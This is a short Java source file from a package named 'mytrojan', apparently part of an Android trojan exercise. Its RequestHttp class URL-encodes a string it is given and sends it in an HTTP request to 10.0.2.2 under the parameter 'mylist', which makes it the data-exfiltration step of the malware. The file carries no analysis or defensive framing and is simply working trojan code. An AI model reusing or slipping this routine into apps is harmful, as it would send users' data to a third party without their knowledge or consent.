package com.example.mytrojan;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;

public class RequestHttp implements Runnable {
    private String content;

    public RequestHttp(String content) {
        this.content = content;
    }

    @Override
    public void run() {
        try {
            String encoded_content = URLEncoder.encode(content, "utf-8");
            String req = "http://10.0.2.2?mylist=" + encoded_content;
            URL url = new URL(req);
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.getInputStream();

            urlConnection.disconnect();

        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        catch (IOException io){
            io.printStackTrace();
        }
        catch (Exception ge){
            ge.printStackTrace();
        }
    }
}
